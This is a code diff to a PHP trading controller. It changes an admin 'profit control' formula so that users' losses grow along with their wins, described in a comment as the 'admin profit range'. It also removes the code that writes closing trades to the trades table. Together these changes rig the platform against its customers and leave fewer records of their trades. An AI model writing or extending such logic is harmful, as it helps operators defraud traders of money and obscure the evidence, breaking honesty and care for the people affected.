@@ -349,8 +349,8 @@ class TradingController
         }
 
         // Apply asymmetric profit control formula:
-        // Positive % = users profit MORE on wins, lose LESS on losses
-        // Negative % = users profit LESS on wins, lose MORE on losses
+        // Positive % = users profit MORE on wins, lose MORE on losses (admin profit range)
+        // Negative % = users profit LESS on wins, lose LESS on losses
         $profitControlPercent = Database::fetch(
             "SELECT value FROM settings WHERE key = ?", 
             ['profit_control_percent']
@@ -363,9 +363,9 @@ class TradingController
             $winMultiplier = 1 + ($controlPercent / 100);
             $adjustedPnl = $pnl * $winMultiplier;
         } else {
-            // Losing trade: positive control reduces loss (negative × smaller multiplier = smaller loss)
-            // Loss Multiplier: 1 - (control% / 100)
-            $lossMultiplier = 1 - ($controlPercent / 100);
+            // Losing trade: positive control increases loss (makes user lose MORE)
+            // Loss Multiplier: 1 + (control% / 100) - same as winning to make losses bigger
+            $lossMultiplier = 1 + ($controlPercent / 100);
             $adjustedPnl = $pnl * $lossMultiplier;
         }
 
@@ -381,17 +381,6 @@ class TradingController
             'balance' => $wallet['balance'] + $adjustedPnl,
             'margin_used' => $wallet['margin_used'] - $position['margin_used'],
         ], 'user_id = ?', [$userId]);
-
-        Database::insert('trades', [
-            'user_id' => $userId,
-            'position_id' => $positionId,
-            'market_id' => $position['market_id'],
-            'side' => $position['side'] === 'buy' ? 'sell' : 'buy',
-            'amount' => $position['amount'],
-            'price' => $exitPrice,
-            'fee' => 0,
-            'created_at' => date('Y-m-d H:i:s'),
-        ]);
 
         AuditLog::log('close_position', 'position', $positionId, [
             'market' => $position['symbol'],
